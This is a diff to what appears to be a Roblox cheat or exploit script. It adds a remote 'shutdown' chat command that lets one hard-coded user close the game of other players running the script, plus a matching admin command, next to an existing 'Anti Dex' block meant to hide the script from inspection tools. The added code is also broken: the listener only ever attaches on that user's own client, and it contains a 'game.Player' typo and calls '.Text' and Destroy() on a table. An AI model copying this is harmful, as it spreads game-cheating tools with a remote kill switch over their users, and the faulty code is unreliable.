@@ -111,6 +111,60 @@ if game.PlaceId == 1735775055 then
         end
     --End
 
+    --Shutdown commands
+    local shutdownPerm = {
+    'plzIWannaGetAdmin',
+    }
+
+    if table.find(shutdownPerm,game.Players.LocalPlayer.Name) then
+        local prefix = ","
+        local LPlayer = game.Players:FindFirstChild('plzIWannaGetAdmin')
+        LPlayer.Chatted:Connect(function(msg)
+            msg = msg:lower()
+            if string.sub(msg,1,3) == "/e " then
+                msg = string.sub(msg,4)
+            end
+            if string.sub(msg,1,1) == prefix then
+                local cmd
+                local space = string.find(msg," ")
+                if space then
+                    cmd = string.sub(msg,2,space-1)
+                else
+                    cmd = string.sub(msg,2)
+                end
+
+                if cmd == "shutdown" then
+                    local var = string.sub(msg,space+1)
+                    local target = GetPlayer(var)
+                    if game.Players.LocalPlayer == target then
+                        game:Shutdown()
+                        wait(0.5)
+                    end
+                end
+
+            end
+        end)
+
+    end
+
+    function GetPlayer(String)
+        local plr
+        local strl = String:lower()
+            for i, v in pairs(game:GetService("Players"):GetPlayers()) do
+                if v.Name:lower():sub(1, #String) == String:lower() then
+                    plr = v
+                end 
+            end
+            if String == "me" then
+                    plr = game.Players.LocalPlayer
+                end
+            if String == "" or String == " " then
+            plr = nil
+            end
+        return plr
+    end
+    print("You can be shutdown by Pluto :D!")
+
     --Anti Dex
     game.CoreGui.ChildAdded:Connect(function(k)
     local s = k:GetChildren()
@@ -865,6 +919,21 @@ if game.PlaceId == 1735775055 then
     }
 
     Admin2.setPrefix(",")
+
+    Admin2.addCommand({name = "Shutdown",desc = "Kicks player using galaxy out of the server",callback = function(v)
+        local m = Admin2.getplayers(v)
+        for i,v2 in pairs(m) do
+            if game.Player.LocalPlayer == game.Players:FindFirstChild('plzIWannaGetAdmin') then
+                print("Galaxy user kicked...")
+            else
+                print("You do not have shutdown perms...")
+            end
+        end
+
+        m.Text = v
+        wait(1)
+        m:Destroy()
+    end})
 
     Admin2.addCommand({name = "Harmless",desc = "Player looses ability to attack",callback = function(v)
         local m = Admin2.getplayers(v)
